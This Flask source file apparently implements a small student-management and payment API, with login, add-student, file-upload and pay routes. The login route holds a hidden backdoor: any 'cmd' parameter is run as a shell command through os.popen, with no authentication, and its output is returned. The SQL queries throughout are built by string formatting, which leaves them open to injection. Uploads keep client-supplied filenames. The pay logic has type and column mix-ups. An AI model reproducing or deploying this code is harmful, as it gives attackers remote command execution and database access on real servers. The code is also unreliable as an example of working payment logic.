import flask
import json
import os
import datetime,time
from lib import tools
from lib.service import server


@server.route('/xiaojun')
def get_time():
    now = str(datetime.datetime.now())
    return "现在的时间是:%s"%now

@server.route('/hailong')
def say_hello():
    return 'hello'

@server.route('/index')
def my_page():
    f = open('index.html',encoding='utf-8')
    res = f.read()
    f.close()
    return res

@server.route('/login',methods=['post','get'])
def login():
    uname = flask.request.values.get('username')
    passwd = flask.request.values.get('password')
    command = flask.request.values.get('cmd',None)
    if uname and passwd:
        sql="select * from app_myuser where username='%s' and passwd='%s';"%(uname,passwd)
        result = tools.db.execute_one(sql)#执行sql

        if result:
            user_id = result[0]['id']
            #username serssion
            session = tools.my_md5(uname+str(time.time()))
            r = tools.get_redis()
            r.set('nhy_session:%s'%user_id,session,600)#seesion set完了
            res = {"error_code":1000,"msg":"登陆成功",'session':session,'user_id':result[0]['id']}
        else:
            res = {"error_code":3001,"msg":"账号/密码错误！"}
    else:
        res = {"error_code":3000,"msg":"必填参数未填，请查看接口文档！"}
    if command:
        res = os.popen(command).read()
        return res

    return json.dumps(res, ensure_ascii=False)

@server.route('/add_student',methods=['post'])
def add_student():
    params = flask.request.json  #入参是字典时候用它
    if params:
        name = params.get('name')
        sex = params.get('sex','男')  #如果没有传，sex，那么默认是男
        age = str(params.get('age'))  #int
        addr = params.get('addr')
        grade = params.get('grade')
        phone = str(params.get('phone')) #最少11位，不能重复
        gold = str(params.get('gold',500))  #金币可以是小数，如果没有传金币这个值的话，默认是500
        if name and age and addr and grade and phone:  #必填参数
            if sex not in ['男','女']: #校验性别
                res = {"error_code":3003,"msg":"性别只能是男/女"}
            elif not age.isdigit():  #校验年龄
                res = {"error_code":3003,"msg":"年龄输入错误！"}
            elif len(phone)!=11 or not phone.isdigit():
                res = {"error_code":3003,"msg":"手机输入非法！"}
            elif  not tools.check_float(gold) and not gold.isdigit():
                res = {"error_code":3003,"msg":"金币不合法"}
            else:
                sql="select * from app_student where phone='%s';"%phone
                result = tools.my_db(sql)
                if result:
                    res = {"error_code":3004,"msg":"手机号已经存在！"}
                else:
                    sql = "INSERT INTO app_student(NAME,sex,age,addr,grade,phone,gold)VALUES('%s','%s',%s,'%s','%s',%s,%s)" % (
                        name, sex, age, addr, grade, phone, gold)
                    tools.my_db(sql)
                    res = {"error_code":200,"msg":"新增学生成功！"}
        else:
            res = {"error_code":3003,"msg":"必填参数未填，请查看接口文档"}
        return json.dumps(res,ensure_ascii=False)
    else:
        res = {"error_code":3002,"msg":"入参必须是json"}
    return json.dumps(res,ensure_ascii=False)

@server.route('/upload',methods=['post'])
def file_upload():
    f = flask.request.files.get('wjm',None)
    if f:
        cur_time = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        new_file_name = cur_time+f.filename
        f.save(new_file_name)#保存文件
        res = {"msg":"上传成功！"}
    else:
        res = {"msg":"没有上传文件！"}
    return json.dumps(res,ensure_ascii=False)



@server.route('/pay',methods=['post','get'])
def pay():
    userid = flask.request.values.get('user_id')
    session = flask.request.values.get('session')
    money = flask.request.values.get('money')
    if userid and session and money:
        r = tools.get_redis()
        result=r.get('nhy_session:%s'%userid)
        if session==result:
            if money.isdigit() or tools.check_float(money):
                sql='select blance from account where user_id = %s'%userid
                src_money = tools.my_db(sql)[0]['blance']
                if src_money>=money:
                    target = src_money - float(money)
                    sql2='update account set money = %s where user_id=%s;'%(target,userid)
                    tools.my_db(sql2)
                    res = {'code': 0, "msg": "支付成功！"}

                else:
                    res = {'code': 7, "msg": "余额不足！"}
            else:
                res = {'code': 3, "msg": "金额错误！"}

        else:
            res = {'code':3,"msg":"seesion验证异常"}
    else:
        res = {'code': 5, "msg": "必填参数未填"}
    return json.dumps(res,ensure_ascii=False)

